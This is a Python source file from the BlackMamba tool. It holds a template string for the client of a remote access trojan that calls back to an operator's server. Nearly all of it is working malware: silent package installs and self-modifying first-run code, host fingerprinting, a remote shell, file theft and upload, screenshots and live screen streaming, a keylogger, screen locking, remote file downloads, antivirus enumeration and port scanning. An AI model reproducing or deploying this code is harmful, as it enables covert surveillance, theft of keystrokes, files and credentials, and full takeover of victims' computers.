####################################################################################
# BLACKMAMBA BY: LOSEYS (https://github.com/loseys)
#
# QT GUI INTERFACE BY: WANDERSON M.PIMENTA (https://github.com/Wanderson-Magalhaes)
# ORIGINAL QT GUI: https://github.com/Wanderson-Magalhaes/Simple_PySide_Base
####################################################################################

"""
It is a base to create te Python file that will be executed in the client host. Some
terms of "body_script" will be replaced:

SERVER_IP
SERVER_PORT
SERVER_V_IP
CLIENT_TAG
SERVER_KEY
"""

body_script = r"""#!/usr/bin/python3

import os
import sys
import time
import random
import platform
from os import environ

environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'

first_execution = True
system_os = platform.platform().lower()

if 'linux' in str(platform.platform()).lower():
    if not 'screen on' in str(os.popen('screen -ls')).lower():
        os.environ["QT_QPA_PLATFORM"] = "offscreen"

if first_execution:
    if 'linux' in system_os:
        os.system(f'chmod 777 {os.path.basename(__file__)}')
        os.system('pip3 install requests')
        os.system('pip3 install Pillow')
        os.system('pip3 install pyautogui')
        os.system('pip3 install wmi')
        os.system('pip3 install pytest-shutil')
        os.system('pip3 install cv2')
        os.system('pip3 install pynput')
        os.system('pip3 install PyQt5')
        os.system('pip3 install PyAutoGUI')
        os.system('pip3 install cryptography')
        os.system('pip3 install opencv-python')
        os.system('pip3 install mss')
        os.system('pip3 install pygame')
        os.system('pip3 install numpy')

    elif 'windows' in system_os:
        os.system('pip install Pillow')
        os.system('pip install requests')
        os.system('pip install pyautogui')
        os.system('pip install wmi')
        os.system('pip install pytest-shutil')
        os.system('pip install cv2')
        os.system('pip install pynput')
        os.system('pip install PyQt5')
        os.system('pip install PyAutoGUI')
        os.system('pip install cryptography')
        os.system('pip install opencv-python')
        os.system('pip install mss')
        os.system('pip install pygame')
        os.system('pip install numpy')

    client_tag_nb = (random.randint(int('1' + '0' * 30), int('9' + '0' * 30)))

    with open(os.path.basename(__file__), 'r') as f:
        _content = f.read()
        f.close()

    with open(os.path.basename(__file__), 'w') as f:
        _content = _content.replace('first_execution = True', 'first_execution = False')
        _content = _content.replace('client_tag = 0', f'client_tag = {client_tag_nb}')
        f.write(_content)
        f.close()
    os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)

import re
import time
import time
import uuid
import socket
import shutil
import select
import pathlib
import requests
import threading
import subprocess
import numpy as np
from mss import mss
from threading import Thread

import pygame
from zlib import compress
from cryptography.fernet import Fernet

try:
    import pyautogui
except:
    #print(1)
    pass

try:
    from pynput.keyboard import Listener
except:
    pass
    
try:
    import cv2
except:
    pass

try:
    from PyQt5 import QtWidgets
except:
    #print(2)
    pass

ip = 'SERVER_IP'
port = SERVER_PORT
port_video = SERVER_V_IP
client_tag = 0
status_strm = True

try:
    pyautogui.FAILSAFE = False
except:
    #print(3)
    pass

try:
    app = QtWidgets.QApplication(sys.argv)
    screen = app.primaryScreen()
    size = screen.size()
    WIDTH = size.width()
    HEIGHT = size.height()
except:
    #print(4)
    pass


def retreive_screenshot(conn):
    global status_strm
    with mss() as sct:
        # The region to capture
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while True:
            try:
                # Capture the screen
                img = sct.grab(rect)
                # Tweak the compression level here (0-9)
                pixels = compress(img.rgb, 6)

                # Send the size of the pixels length
                size = len(pixels)
                size_len = (size.bit_length() + 7) // 8
                conn.send(bytes([size_len]))

                # Send the actual pixels length
                size_bytes = size.to_bytes(size_len, 'big')
                conn.send(size_bytes)

                # Send pixels
                conn.sendall(pixels)
            except:
                # print('except_from_thread_streaming')
                #print(5)
                status_strm = False
                break


def main(host=ip, port=port_video):
    try:
        global status_strm
        ''' connect back to attacker on port'''
        sock = socket.socket()
        sock.connect((host, port))
        sock.send(f'{WIDTH},{HEIGHT}'.encode())
    except:
        #print(6)
        return

    try:
        while status_strm:
            # print('$starting_streaming')
            try:
                thread = Thread(target=retreive_screenshot, args=(sock,))
                thread.start()
                thread.join()
            except:
                break
    except Exception as ee:
        #print(7)
        # print("ERR: ", e)
        sock.close()
        # pygame.close()

    sock.close()
    # pygame.close()


class Client:
    def __init__(self):
        self.timer_rec = False

        while True:
            try:
                self.s = socket.socket()
                self.s.connect((ip, port))
                break
            except Exception as exception:
                #print("Exception: {}".format(type(exception).__name__))
                #print("Exception message: {}".format(exception))
                #print(8)
                time.sleep(15)

        self.tag = str(client_tag)
        first_connection = True
        self.initial_path = pathlib.Path(__file__).parent.absolute()

        if first_connection:
            os_system = str(platform.system()).lower()

            # if os_system == 'windows':
            fingerprint = ['system_info',
                           f'tag:{self.tag}',
                           f'python_version:{platform.python_version()}',
                           f'system:{platform.system()}',
                           f'platform:{platform.platform()}',
                           f'version:{platform.version()}',
                           f'processor:{platform.processor().replace(" ", "-").replace(",-", "-")}',
                           f'architecture:{platform.machine()}',
                           f'uname:{platform.node()}',
                           f'mac_version:{self.get_mac()}',
                           f'external_ip:{self.external_ip_addr()}',
                           f'local_ip:{self.local_ip()}',
                           f'status:off',
                           f'file_path:{os.path.abspath(__file__)}'
                           ]
            fingerprint = self.crypt(fingerprint, 'SERVER_KEY')
            self.s.send(str(fingerprint).encode('utf-8'))

        self.lock_screen_status = False

        self.path_output = pathlib.Path(__file__).parent.absolute()
        self.break_terminal = False
        self.command_terminal = None
        self.active_termial = False

        self.kl_unique = False
        self.stop_logging = False;
        # print(f"OS => {platform.platform()}")

        f = open('output.txt', 'wb')

        if 'windows' in str(platform.platform()).lower():
            self.proc = subprocess.Popen('cmd.exe', stderr=subprocess.STDOUT, stdin=subprocess.PIPE, stdout=f)

        elif 'linux' in str(platform.platform()).lower() or 'linux' in str(platform.system()).lower():
            self.proc = subprocess.Popen('/bin/bash', stderr=subprocess.STDOUT, stdin=subprocess.PIPE, stdout=f)

        self.monitoring()

    def call_terminal(self, command_server):
        rmv_st = command_server
        if command_server == '-restore':
            try:
                with open('output.txt', 'r') as ff:
                    strc = ff.read()
                    ff.close()

                ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
                output_ansi = ansi_escape.sub('', strc)
                strc = output_ansi

                with open('output.txt', 'wb') as ff:
                    ff.write(bytes(strc, encoding='utf-8'))
                    ff.close()

                with open('output.txt', 'rb') as gotp:
                    content_otp = gotp.read()
                    try:
                        content_otp = content_otp.replace(b'\\x00', b'')
                        content_otp = content_otp.replace(b'\x00', b'')
                    except:
                        #print(9)
                        pass
                    gotp.close()
                time.sleep(2)
                # string_output = content_otp.encode('utf-8')
                # print(f'-RESTORE {content_otp}')
                return content_otp
            except:
                #print(10)
                time.sleep(2)
                string_output = 'Has not possible to recovery the last STDOUT\.n'
                # string_output = content_otp.encode('utf-8')
                return string_output


        elif command_server == '-restart':
            try:
                os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)
                return
            except:
                #print(11)
                string_output = '\nWas not possible to restart the .\n.'
                string_output = string_output.encode('utf-8')
                return string_output

        command = str(command_server)

        #print(f'[{command}]')

        # if command == "cls":
        open('output.txt', 'wb').close()

        os_sys = str(platform.platform()).lower()

        if 'winwdows' in os_sys:
            os.system('cls')

        if 'linux' in os_sys:
            os.system('clear')

        time.sleep(0.1)
        # else:
        command = command.encode('utf-8') + b'\n'
        self.proc.stdin.write(command)
        self.proc.stdin.flush()
        time.sleep(2)

        with open('output.txt', 'r') as ff:
            strc = ff.read()
            ff.close()

        ansi_escape = re.compile(r'(?:\x1B[@-_]|[\x80-\x9F])[0-?]*[ -/]*[@-~]')
        output_ansi = ansi_escape.sub('', strc)
        strc = output_ansi

        with open('output.txt', 'wb') as ff:
            ff.write(bytes(strc, encoding='utf-8'))
            ff.close()



        with open('output.txt', 'rb') as ff:
            string_output = ff.read()
            try:
                string_output = string_output.replace(b'\\x00', b'')
                string_output = string_output.replace(b'\x00', b'')
            except:
                #print(12)
                pass

        #print(f'to server -> {string_output}')

        # string_output = string_output.encode('utf-8')
        # print(string_output)
        # try:
        #    print(string_output)
        # except:
        #    pass
        
        try:
            check_stb = string_output[:len(rmv_st)]
            if check_stb == bytes(rmv_st, encoding='utf-8'):
                rmv_stb = bytes(rmv_st, encoding='utf-8') + b'\n'
                #print(rmv_stb)
                string_output = string_output.replace(rmv_stb, b'')  
        except Exception as exception:
            print("Exception: {}".format(type(exception).__name__))
            print("Exception message: {}".format(exception))

        #print(f'final{string_output}')

        return string_output

    def monitoring(self):
        while True:
            try:
                ###########time.sleep(2)
                # socket.settimeout(40)
                #print('waiting')
                self.s.settimeout(60)
                string_server = self.s.recv(1024*1024).decode()
                #print(f'string server -> {string_server}')
                # socket.settimeout(45)
            except Exception as exception:
                #print("Exception: {}".format(type(exception).__name__))
                #print("Exception message: {}".format(exception))
                #print(13)
                # caso desligue com lock ativo vvvv
                self.lock_screen_status = False
                ##################################

                self.s.close()
                while True:
                    ############time.sleep(2)
                    try:
                        self.s = socket.socket()
                        self.s.connect((ip, port))
                        os_system = str(platform.system()).lower()

                        # if os_system == 'windows':
                        fingerprint = ['system_info',
                                       f'tag:{self.tag}',
                                       f'python_version:{platform.python_version()}',
                                       f'system:{platform.system()}',
                                       f'platform:{platform.platform()}',
                                       f'version:{platform.version()}',
                                       f'processor:{platform.processor().replace(" ", "-").replace(",-", "-")}',
                                       f'architecture:{platform.machine()}',
                                       f'uname:{platform.node()}',
                                       f'mac_version:{self.get_mac()}',
                                       f'external_ip:{self.external_ip_addr()}',
                                       f'local_ip:{self.local_ip()}',
                                       f'status:off',
                                       ]
                        fingerprint = self.crypt(fingerprint, 'SERVER_KEY')
                        self.s.send(str(fingerprint).encode('utf-8'))
                        break
                    except:
                        #print(14)
                        time.sleep(15)
                        pass

            # error aqui
            time.sleep(1) ################1335
            try:
                rcvdData = str(string_server).replace("b'", "").replace("'", "")
            except Exception as exception:
                #print("Exception: {}".format(type(exception).__name__))
                #print("Exception message: {}".format(exception))
                #print(15)
                continue

            try:
                rcvdData = bytes(rcvdData, encoding='utf-8')
                str_content = self.decrypt(rcvdData, 'SERVER_KEY')
                str_content = str(str_content).replace("b'", "").replace("'", "")
            except:
                #print(16)
                continue

            # print(f'recbido -> {str_content}')

            # if not 'hello' in str(string_server) and str(string_server) != '' and str(string_server) != '  ':
            if str_content != 'hello' and str_content != '' and str_content != '  ':
                # print(f'S: {str_content}')

                # response = self.identify(str(str_content))

                response = self.identify(str_content)

                # print(f'TO SERVER => -{response}')

                try:
                    response = self.crypt(response, 'SERVER_KEY')
                    response = response.replace(b'b', b'%%GBITR%%')
                    # print('----------------')
                    # print(response)
                    # print('----------------')
                    # self.s.send(str(response).encode('utf-8'))
                    self.s.send(response)

                    del (string_server)
                    del (rcvdData)
                    del (str_content)
                    del (response)

                except:
                    #print(17)
                    # 'ALERTA DE EXCEPT')
                    pass
            # time.sleep(1)

    def identify(self, command):
        if '[SYSTEM_SHELL]' in command:
            try:
                command = command.replace('[SYSTEM_SHELL]', '')
                response = self.call_terminal(command)


                return response

            except:
                #print(18)
                pass

        elif '[FGET]' in command:
            command = command.replace('[FGET]', '')
            try:

                with open(command, 'rb') as file_content:
                    f_ct = file_content.read()
                    file_content.close()

                f_ct = self.crypt_file(f_ct, 'SERVER_KEY')

                with open(f'{command}_tmp', 'wb') as file_cpt:
                    file_cpt.write(f_ct)

                del (f_ct)
            except:
                #print(19)
                content = 'An error has occurred, please try again.'
                return content

            try:
                f = open(f'{command}_tmp', 'rb')
            except:
                #print(20)
                content = 'An error has occurred, please try again.'
                return

            l = f.read(1024)
            # print('Sending FGET')
            time.sleep(2)
            while (l):
                try:
                    # l = self.crypt(l, 'SERVER_KEY')
                    # l = l.replace(b'b', b'%%GBITR%%')
                    # print(f'> {l}')
                    self.s.settimeout(5)
                    self.s.send(l)
                except:
                    #print(21)
                    # print('except FGET')
                    break
                l = f.read(1024)
            f.close()
            time.sleep(0.5)

            # try:
            #    self.s.send(b'\\end\\')
            # except:
            #    print('except no \\end\\')
            #    pass

            try:
                os.remove(f'{command}_tmp')
            except:
                #print(22)
                content = 'An error has occurred, please try again.'
                return content
            time.sleep(5)

            end_tag = '%&@end__tag@&%'
            self.s.send(end_tag.encode('utf-8'))
            # print('FIM')
            return end_tag

        elif '[FPUT]' in command:
            # elif command.startwith('[FPUT]'):
            command = command.replace('[FPUT]', '')
            # continue
            try:
                for e in range(20):
                    self.s.settimeout(0.5)
                    clear_buff = self.s.recv(1024 * 1024 * 1024)
                    # 'buffer cleaned FGET')
            except:
                #print(22)
                pass

            try:
                f = open(f'{command}', 'wb')
                self.s.settimeout(25)
                l = self.s.recv(1024)
                # l = str(c.recv(1024))

                # l = l.replace('b"', '')
                # l = l.replace("b'", '')
                # l = l.replace('"', '')
                # l = l.replace("'", '')
                # l = l.replace('%%GBITR%%', 'b')
                # l = bytes(l, encoding='utf-8')

                while (l):
                    # print(f'FRAGMENTO {l}')
                    # print(f'writing => {l}')

                    if '%@end_tag@%' in l.decode('utf-8'):
                        # print('a casa caiu')
                        break

                    f.write(l)

                    l = self.s.recv(1024 * 1024)
                    # l = str(c.recv(1024))
                    # l = l.replace('b"', '')
                    # l = l.replace("b'", '')
                    # l = l.replace('"', '')
                    # l = l.replace("'", '')
                    # l = l.replace('%%GBITR%%', 'b')
                    # l = bytes(l, encoding='utf-8')
                f.close()
                # print('FIM ARQUIVO\n\n\n')

                with open(f'{command}', 'rb') as a:
                    b = a.read()

                try:
                    b = self.decrypt(b, 'SERVER_KEY')

                    with open(f'{command}', 'wb') as c:
                        c.write(b)
                except:
                    #print(24)
                    pass
            except:
                #print(25)
                pass

        elif '[@%WEBGET%@]' in command:
            try:
                with open('tmp_call', 'w') as tmpc:
                    tmpc.write(command)
            except:
                #print(26)
                time.sleep(2)
                return
            thread_strmg = threading.Thread(target=self.webget_file, args=())
            thread_strmg.daemon = True
            thread_strmg.start()
            time.sleep(2)
            return

        elif '[@%WEBRAW%@]' in command:
            try:
                with open('tmp_call', 'w') as tmpc:
                    tmpc.write(command)
            except:
                #print(27)
                time.sleep(2)
                return
            thread_strmg = threading.Thread(target=self.webraw_file, args=())
            thread_strmg.daemon = True
            thread_strmg.start()
            time.sleep(2)
            return

        elif '%get-screenshot%' in command:
            # elif command.startwith('%get-screenshot%'):

            try:
                image = pyautogui.screenshot()
            except:
                #print(28)
                return

            image.save(f'screeenshot_{self.tag}.png')
            time.sleep(0.2)

            with open(f'screeenshot_{self.tag}.png', 'rb') as f:
                content_image = f.read()
                f.close()

            # os.remove(f'screeenshot_{self.tag}.png')

            with open(f'screeenshot_crypt_{self.tag}.png', 'wb') as f:
                f.write(self.crypt_file(content_image, 'SERVER_KEY'))
                f.close()

            f = open(f'screeenshot_crypt_{self.tag}.png', 'rb')
            # f = open(f'screeenshot_{self.tag}.png', 'rb')

            l = f.read(1024)
            # print('Sending PNG')
            while (l):
                # print(">>>", l)
                try:
                    self.s.send(l)
                except:
                    #print(29)
                    # print("break conexao");
                    break
                l = f.read(1024)
            f.close()
            time.sleep(2)

            try:
                self.s.send(b'\\@%end%@\\')
            except:
                #print(30)
                pass

            try:
                os.remove(f'screeenshot_{self.tag}.png')
                os.remove(f'screeenshot_crypt_{self.tag}.png')
            except:
                #print(31)
                pass

            return

        elif '%lock-screen%' in command:
            # elif command.startwith('%lock-screen%'):
            threadd = threading.Thread(target=self.lock_screen, args=())
            threadd.daemon = True
            threadd.start()
            time.sleep(2)
            return


        elif '%unlock-screen%' in command:
            # elif command.startwith('%unlock-screen%'):
            self.lock_screen_status = False
            time.sleep(2)
            return

        elif '%sv-init-live-video%' in command:
            # elif command.startwith('%sv-init-live-video%'):
            thread_strmg = threading.Thread(target=self.start_streaming, args=())
            thread_strmg.daemon = True
            thread_strmg.start()

        elif '%start-kl-function%' in command:
            # print(self.stop_logging, self.kl_unique)
            if self.kl_unique:
                return
            else:
                self.kl_unique = True
            thread = threading.Thread(target=self.kl_main, args=())
            thread.daemon = True
            thread.start()
            time.sleep(2)
            return

        elif '%stop-kl-function%' in command:
            self.stop_logging = True
            self.kl_unique = False
            time.sleep(2)
            return

        elif '%print-kl-function%' in command:
            try:
                with open('kl_log.txt', 'r') as get_kll:
                    log_string = get_kll.read()
                    get_kll.close()
                time.sleep(2)
                return f'[@%HOST_SHELL%@]{log_string}'
            except:
                #print(32)
                response = '\nHas not possible to open the keylogger log.\n'
                time.sleep(2)
                return response
                
        elif '-update' in command:
            if 'windows' in str(platform.platform()).lower():
                try:
                    output = str(subprocess.check_output(['wmic', 'qfe', 'get', 'Description,', 'HotFixID,', 'InstalledOn'])).split('\\r\\r\\n')[1:-2]
                    count = 0
                    d = dict()
                    for x in output:
                        x = x.split()
                        d[count] = {'Description': x[0], 'HotFixID': x[1], 'InstalledOn': x[2]}
                        count += 1
                    cont_lst = f'[@%HOST_SHELL%@]'
                    for x in d.values():
                        for k, v in x.items():
                            cont_lst += f'{k}: {v}\n'
                        cont_lst += f'\n'
                    print(cont_lst)
                    return cont_lst
                except:
                    f'[@HOST_SHELL%@]An error was occurred'
            else:
                return f'[@HOST_SHELL%@]Not windows'
        
        elif '-portscan' in command:
            class port_scan:
                def __init__(self):
                    self.open_ports = list()

                def checking_port(self, host, port):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        self.open_ports.append(f'{host}/{port} - Open\n')
                    except:
                        pass

                def main(self):
                    try:
                        port_range = [0, 65536] if len(command.split()) == 1 else command.split()[1].split(':')
                        for port_num in range(int(port_range[0]), int(port_range[1])):
                            t = Thread(target=self.checking_port, args=(ip, port_num))
                            t.start()
                        return self.open_ports
                    except:
                        return 'Try again, use this syntax:\n\n-portscan int:int or -portscan'

            start = port_scan()
            a = start.main()
            full = f'[@%HOST_SHELL%@]Open ports:\n\n' if not 'Try again' in a else f'[@%HOST_SHELL%@]' 
            for x in a:
                full += x
            return full
            
        elif '-antivirus' in command:
            if 'windows' in str(platform.platform()).lower():
                try:
                    path = r'/Namespace:\\root\SecurityCenter2'
                    ant = 'AntiVirusProduct'
                    clean = f'[@%HOST_SHELL%@]'
                    collected = subprocess.check_output(['wmic', r'{}'.format(path), 'path', ant, 'get', r'/value'])
                    analyzing = str(collected)
                    if r"b'\r\r\n\r\r\n\r\r\n" in analyzing:
                        clean += 'No Instance(s) Avaliable.'
                    else:
                        analyzing = analyzing.replace(r'\r\r\n', '    ')
                        analyzing = analyzing.split('    ')
                        for x in analyzing:
                            if 'displayName' in x or 'pathToSignedProductExe' in x or 'pathToSignedReportingExe' in x or 'productState' in x or'timestamp' in x:
                                x = x.replace('\\\\', '\\')
                                splipted = x.split('=')
                                if 'displayName' in x:
                                    clean += '=-' * 50 + '\n'
                                    clean += splipted[1] + '\n'
                                else:
                                    clean += '\t - ' + x + '\n'

                    return clean
                except:
                    return f'[@HOST_SHELL%@]An error was occurred'
            else:
                return f'[@HOST_SHELL%@]Not windows'

        elif '@%list-softwares%@' in command:
            if 'windows' in str(platform.platform()).lower():
                try:
                    data = subprocess.check_output(['wmic', 'product', 'get', 'name'])
                    data_str = str(data)
                    cont_tmp = []
                    cont_lst = f'[@%HOST_SHELL%@]'
                except:
                    #print(33)
                    return

                try:
                    for i in range(len(data_str)):
                        string_part = (data_str.split("\\r\\r\\n")[6:][i])
                        string_part = string_part.lstrip().rstrip()
                        if string_part != '' and string_part != ' ' and string_part != '"' and string_part != "'":
                            cont_tmp.append(string_part)

                except IndexError as e:
                    #print(34)
                    pass
                try:
                    for i in cont_tmp:
                        cont_lst += i + '\n'
                except:
                    #print(35)
                    pass

                return cont_lst

            elif 'linux' in str(platform.platform()).lower():
                try:
                    cont_lst = f'[@%HOST_SHELL%@]'
                    response = subprocess.getoutput('ls /bin && ls /opt')
                    # response = response.split('\\n')
                    cont_lst += str(response).replace("[", "");
                    time.sleep(2)
                    return cont_lst
                except:
                    #print(36)
                    pass
        else:
            response = 'error'
            return response

    def start_streaming(self):
        global status_strm
        dir_path = os.path.dirname(os.path.realpath(__file__))
        try:
            # os.system(f'{dir_path}/vstrm.py')
            status_strm = True
            main()

        except:
            #print(37)
            pass

    def lock_screen(self):
        self.lock_screen_status = True
        while self.lock_screen_status:
            pyautogui.moveTo(1, 1)

    def windows_screenshot_stream(self, number):
        try:
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(f'images/{number}.png')
        except:
            #print(38)
            pass

    def webget_file(self):
        try:
            with open('tmp_call', 'r') as tmpc:
                command = tmpc.read()
            os.remove('tmp_call')

            command = command.replace('[@%WEBGET%@]', '')
            command = command.replace('-webget', '').replace(' -f ', ',')
            command = command.split(',')

            url = command[0]
            get_response = requests.get(url, stream=True)
            file_name = url.split("/")[-1]
            with open(command[1], 'wb') as f:
                for chunk in get_response.iter_content(chunk_size=1024):
                    if chunk:  # filter out keep-alive new chunks
                        f.write(chunk)
                f.close()
        except:
            #print(39)
            try:
                os.remove('tmp_call')
                os.remove(command[1])
            except:
                #print(40)
                pass

    def webraw_file(self):
        try:
            with open('tmp_call', 'r') as tmpc:
                command = tmpc.read()
            os.remove('tmp_call')

            command = command.replace('[@%WEBRAW%@]', '')
            command = command.replace('-webraw', '').replace(' -f ', ',')
            command = command.split(',')

            url = command[0]
            html = requests.get(url).content

            with open(command[1], 'w') as f:
                f.write(html.decode('utf-8'))
                f.close
        except:
            #print(41)
            try:
                os.remove('tmp_call')
                os.remove(command[1])
            except:
                #print(42)
                pass

    # @staticmethod
    def kl_main(self):
        while not self.stop_logging:
            with Listener(on_press=self.writeLog) as l:
                # l.join()
                while True:
                    if self.stop_logging:
                        l.stop()
                        self.kl_unique = False
                        self.stop_logging = False
                        return

                    time.sleep(1)

            keydata = str(key)

    # @staticmethod
    def writeLog(self, key):
        keydata = str(key)
        # print(self.stop_logging)
        try:
            with open('kl_log.txt', 'r') as create_f:
                create_f.close()
        except:
            #print(43)
            with open('kl_log.txt', 'w') as create_f:
                create_f.close()

        with open("kl_log.txt", "a") as f:
            if 'Key.space' in keydata:
                f.write(' ')
            elif 'Key' in keydata:
                return
                # f.write(f'<{keydata}>')
            else:
                f.write(keydata.replace("'", ''))

    @staticmethod
    def crypt(msg, key):
        command = str(msg)
        command = bytes(command, encoding='utf8')
        cipher_suite = Fernet(key)
        encoded_text = cipher_suite.encrypt(command)
        return encoded_text

    @staticmethod
    def crypt_file(msg, key):
        cipher_suite = Fernet(key)
        encoded_text = cipher_suite.encrypt(msg)
        return encoded_text

    @staticmethod
    def decrypt(msg, key):
        cipher_suite = Fernet(key)
        decoded_text_f = cipher_suite.decrypt(msg)
        return decoded_text_f

    @staticmethod
    def local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lip = s.getsockname()[0]
        s.close()
        return lip

    @staticmethod
    def external_ip_addr():
        try:
            exip = requests.get('https://www.myexternalip.com/raw').text
            exip = str(exip).replace(' ', '')
            
        except:
            #print(44)
            exip = 'None'

        return exip

    @staticmethod
    def get_mac():
        # mac_num = hex(uuid.getnode()).replace('0x', '').upper()
        mac_num = hex(uuid.getnode()).replace('0x', '00').upper()
        mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
        return mac


if __name__ == '__main__':
    client = Client()
    client.__init__()
"""
